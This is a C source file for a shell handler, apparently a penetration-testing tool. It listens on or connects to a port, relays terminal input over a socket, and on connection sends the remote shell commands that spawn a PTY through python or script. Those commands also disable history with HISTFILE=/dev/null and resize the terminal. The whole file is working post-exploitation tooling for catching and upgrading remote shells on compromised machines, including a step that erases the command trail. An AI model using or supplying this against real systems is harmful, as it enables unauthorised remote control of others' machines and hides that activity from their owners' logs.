#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <signal.h>

#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netdb.h>

#include <stdarg.h>
#include <stdbool.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <time.h>
#include <termios.h>
#include <fcntl.h>

#include <libgen.h>

#define SBUFFSIZE 4096 // Socket buffer size
#define IBUFFSIZE 1024 // stdin buffer size

#define ISOK 0 // Success / OK
#define ISER 1 // ERROR
#define ISST 2 // Status
#define ISNI 3 // Misc pretty for cyan mode - neither status, good or bad, just useful

#define red "\e[1;31m"
#define green "\e[1;32m"
#define yellow "\e[1;33m"
#define cyan "\e[1;36m"

#define SERVER 0
#define CLIENT 1

// char pointer representing the file name of this program
const char *self;

// Make useful socket info such as file descriptors and ports globally accessible
int sock, client, cport, port;
char *clientIP;
char *rhost;

char noSockCode[12];
char randomStr[12];

int mode;

// Terminal attributes
struct termios sane, raw;

// Global booleans representing weather or not the `sock` and `client` file descriptors have been closed, respectively
bool SCLOSED, CCLOSED, isRaw;
bool LOCAL, isListen = false;
bool HAS_CLEANED = false;

// Function prototyping to ensure functions can call each other regardless of where they are defined
void cleanup(void);
void sigint_handler(int signal);
void sigwinch_handler(int signal);

void generate_random_string(char *str, size_t size) {
	const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

	if (size){
		--size;
		srand(time(NULL));
		for (size_t n = 0; n < size; n++) {
			int key = rand() % (int)(sizeof(charset) -1);
			str[n] = charset[key];
		}
		str[size] = '\0';
	}

	return;
}

// Provides nice colorful output, similar to Python `print(colored("foo"))`
// ChatGPT helped with providing string formatting (va_list, va_start, etc)
void print(int mode, char *msg, ...){
	va_list args;
	va_start(args, msg);

	switch (mode){
		case ISOK:
			fprintf(stderr, "%s[+] ", green);
			vfprintf(stderr, msg, args);
			fprintf(stderr, "\e[0m");
			break;

		case ISER:
			fprintf(stderr, "%s[-] ", red);
			vfprintf(stderr, msg, args);
			fprintf(stderr, "\e[0m");
			break;

		case ISST:
			fprintf(stderr, "%s[*] ", yellow);
			vfprintf(stderr, msg, args);
			fprintf(stderr, "\e[0m");
			break;

		case ISNI:
			fprintf(stderr, "%s[*] ", cyan);
			vfprintf(stderr, msg, args);
			fprintf(stderr, "\e[0m");
			break;
		}

	va_end(args);
	fflush(stderr);

	return;
}

// Flush all standard I/O streams
void ioFlush(void){
	fflush(stdin);
	fflush(stdout);
	fflush(stderr);

	return;
}

// Socket initalization - returns `true` upon success, and `false` upon failure
bool init(void){
	int option = 1;
	
	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	
	if (sock == -1){
		fprintf(stderr, "%s: unable to create socket: %s\n", self, strerror(errno));
		return false;
	}

	struct sockaddr_in serv_addr, client_addr;
	socklen_t addr_size;

	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(port);
	
	if (mode == SERVER){
		serv_addr.sin_addr.s_addr = INADDR_ANY;
	}

	else if (mode == CLIENT){
		struct hostent *server = gethostbyname(rhost);
		if (server == NULL){
			fprintf(stderr, "%s: gethostbyname '%s': %s\n", self, rhost, strerror(errno));
			return false;
		}
		bcopy((char *)server->h_addr,(char *)&serv_addr.sin_addr.s_addr, server->h_length);
	}

	switch (mode) {
		case SERVER:
			// Server mode
			if (setsockopt(sock, SOL_SOCKET, (SO_REUSEADDR | SO_REUSEPORT), (char*)&option, sizeof(option)) < 0){
				fprintf(stderr, "%s: setsockopt failed: %s\n", self, strerror(errno));
				return false;
			}

			if (bind(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0){
				fprintf(stderr, "%s: unable to bind socket: %s\n", self, strerror(errno));
				return false;
			}

			if (listen(sock, 1) < 0){
				fprintf(stderr, "%s: unable to listen: %s\n", self, strerror(errno));
				return false;
			}

			print(ISNI, "Listening on 0.0.0.0:%d\n", port);
			isListen = true;

			if ((client = accept(sock, (struct sockaddr*)&client_addr, &addr_size)) == -1){
				fprintf(stderr, "%s: unable to accept connection: %s\n", self, strerror(errno));
				return false;
			}
			
			isListen = false;
			
			clientIP = inet_ntoa(client_addr.sin_addr);
			cport = ntohs(client_addr.sin_port);
			
			if (clientIP != NULL){
				print(ISOK, "Connection from %s:%d\n", clientIP, cport);
			}

			// We close the server socket because we don't want to continue to listen after a connection has been established
			if (close(sock) == -1){
				fprintf(stderr, "%s: unable to close server: %s\n", self, strerror(errno));
				return false;
			}

			else {
				SCLOSED = true;
			}
			break;

		case CLIENT:
			// Client mode
			if (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == -1){
				print(ISER, "Could not connect to %s: %s\n", rhost, strerror(errno));
				return false;
			}

			print(ISOK, "Connected to %s:%d\n", rhost, port);

			client = sock;
			break;
	}

	// Save the current terminal attributes so we can set them back to normal or `sane` later
	if (tcgetattr(STDIN_FILENO, &sane) == -1){
		fprintf(stderr, "%s: tcgetattr failed: %s\n", self, strerror(errno));
	}
	
	// Create a termios configuration for `raw` mode
	cfmakeraw(&raw);
	
	// Set the terminal into `raw` mode (basically 'stty raw -echo')
	if (tcsetattr(STDIN_FILENO, TCSANOW, &raw) == -1){
		fprintf(stderr, "%s: tcsetattr failed: %s\n", self, strerror(errno));
	}
	else {
		isRaw = true;
	}
	
	// Create a signal handler for the `SIGWINCH` signal (window change)
	signal(SIGWINCH, sigwinch_handler);

	return true;
}

// Send EOF (\x04) to the socket to simulate pressing CTRL+D in a shell
int reof(void){
	char eof[] = "\x04";

	if (send(client, eof, strlen(eof), 0) == -1){
		fprintf(stderr, "%s: %s: %s\n", self, "reof", strerror(errno));
		return -1;
	}

	return EXIT_SUCCESS;
}

// Send SIGINT (\x03) to the socket to simulate pressing CTRL+C in a shell
int rinit(void){
	char sigint[] = "\x03";

	if (send(client, sigint, sizeof(sigint), 0) == -1){
		fprintf(stderr, "%s: %s: %s\n", self, "rinit", strerror(errno));
		return -1;
	}

	return EXIT_SUCCESS;
}

// Simply run a command without returning output
bool run(const char command[]){
	char full_command[strlen(command) + 256];

	snprintf(full_command, sizeof(full_command), " echo %s; %s", noSockCode, command);
	ssize_t s = send(client, full_command, strlen(full_command), 0);

	if (s != strlen(full_command)){
		return false;
	}

	return true;
}

// Provides asynchronous I/O operations between STDIN and the socket (client) using `select`
bool sstdio(void){
	fd_set readfds;
	int maxfd = client + 1;
	char buffer[SBUFFSIZE];
	char ibuffer[IBUFFSIZE];
	ssize_t size, n;

	while (true){
		FD_ZERO(&readfds);
		FD_SET(client, &readfds);
		FD_SET(STDIN_FILENO, &readfds);

		select(maxfd, &readfds, NULL, NULL, NULL);
		
		// Read from `client` (socket) and write to STDOUT
		if (FD_ISSET(client, &readfds)) {
			size = read(client, buffer, SBUFFSIZE);
			if (size == -1){
				fprintf(stderr, "%s: read error: %s\n", self, strerror(errno));
				break;
			}

			if (size == 0) {
				mode == SERVER ? print(ISER, "Connection %s:%d closed by remote host", clientIP, cport) : print(ISER, "Connection %s:%d closed by remote host", rhost, port);
				break;
			}
			
			// We don't want to show output if `noSockCode` is in the data
			if (strstr(buffer, noSockCode)){
				memset(buffer, '\0', sizeof(buffer));
			}

			n = write(STDOUT_FILENO, buffer, size);

			if (n != size){
				fprintf(stderr, "%s: write error: %s\n", self, strerror(errno));
				break;
			}
		}
		
		// Read from STDIN and write to socket (client)
		if (FD_ISSET(STDIN_FILENO, &readfds) && LOCAL == false) {
			size = read(STDIN_FILENO, ibuffer, IBUFFSIZE);

			if (size == 0) {
				print(ISER, "Connection %s:%d closed by user", clientIP, cport);
				break;
			}

			n = write(client, ibuffer, size);
			
			if (n != size){
				fprintf(stderr, "%s: write error: %s\n", self, strerror(errno));
				break;
			}
		}
	}

	return true;
}

/* Cleans up by closing all sockets and resetting terminal attributes from `raw` back to `sane` or normal 
 * Implements several checks to ensure that the file descriptors are not already closed and are valid, and if the terminal is already in `sane` mode
*/
void cleanup(void){
	if (HAS_CLEANED == true){
		return;
	}

	if (SCLOSED == false && sock > STDERR_FILENO && fcntl(sock, F_GETFD) > -1){
		if (close(sock) == -1){
			fprintf(stderr, "%s: could not close sock: %s [FD N %d]\n", self, strerror(errno), sock);
		}
		else {
			SCLOSED = true;
		}
	}

	if (CCLOSED == false && client > STDERR_FILENO && fcntl(client, F_GETFD) > -1){
		if (close(client) == -1){
			fprintf(stderr, "%s: could not close client: %s [FD N %d]\n", self, strerror(errno), client);
		}
		else {
			CCLOSED = true;
		}
	}
	
	if (isRaw == true){
		if (tcsetattr(STDIN_FILENO, TCSANOW, &sane) == -1){
			fprintf(stderr, "%s: tcsetattr failed: %s\n", self, strerror(errno));
		}
	}

	HAS_CLEANED = true;

	exit(EXIT_SUCCESS);

	return;
}

// Get the current terminal size (rows and columns) and send resize instructions to the remote shell (stty rows x columns y)
void resize(void) {
	struct winsize w;

	if (ioctl(STDOUT_FILENO, TIOCGWINSZ, &w) == -1){
		fprintf(stderr, "%s: ioctl failed: %s\n", self, strerror(errno));
		return;
	}
	
	int rows = w.ws_row;
	int cols = w.ws_col;

	char command[256];
	snprintf(command, sizeof(command), "/bin/stty rows %d columns %d\n", rows, cols);

	if (run(command) == false){
		fprintf(stderr, "%s: resize failed: %s\n", self, strerror(errno));
	}

	errno = 0;

	return;
}

// Call the `resize` function everytime the window is changed or SIGWINCH is catched
void sigwinch_handler(int signal){
	resize();

	return;
}

void signal_handler(int sig){
	printf("\n");
	print(ISER, "%s: %s: closing socket\n", self, strsignal(sig));

	cleanup();

	return;
}

// Spawns a PTY and and stabilizes your shell
void stabilize(void){
	const char auto_pty[] = "export LANG=en_US.UTF-8;export HISTFILE=/dev/null;export PATH=$PATH:/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/snap/bin; PYS='import pty;pty.spawn(\"/bin/sh\")';PYB='import pty;pty.spawn(\"/bin/bash\")'; [ -f /bin/bash ] && [ -f /usr/bin/script ] &&  exec /usr/bin/script /dev/null -qc '/bin/bash -i' || [ -f /usr/bin/python3 ] && /usr/bin/python3 -c $PYB || [ -f /usr/bin/python3.5 ] && exec /usr/bin/python3.5 -c $PYB|| [ -f /usr/bin/python3.9 ] && exec /usr/bin/python3.9 -c $PYB|| [ -f /usr/bin/python3.10 ] && exec /usr/bin/python3.10 -c $PYB|| [ -f /usr/bin/python2 ] && exec /usr/bin/python2 -c $PYB; [ -f /bin/sh ] && [ -f /usr/bin/python3 ] && exec /usr/bin/python3 -c $PYS|| [ -f /usr/bin/python3.5 ] && exec /usr/bin/python3.5 -c $PYS|| [ -f /usr/bin/python3.9 ] && exec /usr/bin/python3.9 -c $PYS|| [ -f /usr/bin/python3.10 ] && exec /usr/bin/python3.10 -c $PYS|| [ -f /usr/bin/script ] && exec /usr/bin/script /dev/null -qc '/bin/sh -i'|| [ -f /usr/bin/python2 ] && exec /usr/bin/python2 -c $PYS || echo Unable to spawn PTY.\n";
	
	const char misc[] = "export TERM=xterm-256color; /usr/bin/reset xterm-256color;export SHELL=/bin/bash;export TERM=xterm-256color;alias pwnenv='env | /bin/grep --color=none PWNTTY';/usr/bin/clear;export SHELL=/bin/bash;export TERM=xterm-256color;/bin/stty sane;/bin/stty -brkint -imaxbel iutf8;export HISTFILE=/dev/null;bind \"TAB:menu-complete\";bind \"set show-all-if-ambiguous on\";export SHLVL=1;alias ls='ls -lha --color=auto';bind \"set completion-ignore-case On\";bind 'set colored-stats On';PROMPT_COMMAND=\"PROMPT_COMMAND=echo\"; [ $0 = \"/bin/bash\" ] && PS1='\\[\\e]0;\\u@\\h: \\w\\a\\]${debian_chroot:+($debian_chroot)}\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;36m\\]\\w\\[\\033[00m\\]\\$ '\n";

	run(auto_pty);
	usleep(300000);

	resize();
	run(misc);

	return;
}

int main(int argc, char **argv){
	self = argv[0];

	if (argc < 2){
		fprintf(stderr, "%s: missing PORT operand\n\nusage: %s <PORT> [HOST]\n", self, self);
		return EXIT_FAILURE;
	}
	
	mode = (argc == 2) ? SERVER : CLIENT;
	
	// Make sure we clean up when the program exits
	atexit(cleanup);

	// Catch common signals that may result in a leak or unclosed file descriptors
	signal(SIGTERM, signal_handler);
	signal(SIGINT, signal_handler);
	signal(SIGPIPE, signal_handler); // In our use case, SIGPIPE is usally signaled when we try to read from the socket after the remote host abruptly exited

	port = atoi(argv[1]);

	if (port <= 0 || port > 65535){
		fprintf(stderr, "%s: invalid port: please choose between 1-65535\n", self);
		return EXIT_FAILURE;
	}

	if (mode == 1){
		rhost = argv[2];
	}

	generate_random_string(noSockCode, 10);
	
	if (init() == false){
		return EXIT_FAILURE;
	}

	stabilize();

	sstdio();

	return EXIT_SUCCESS;
}
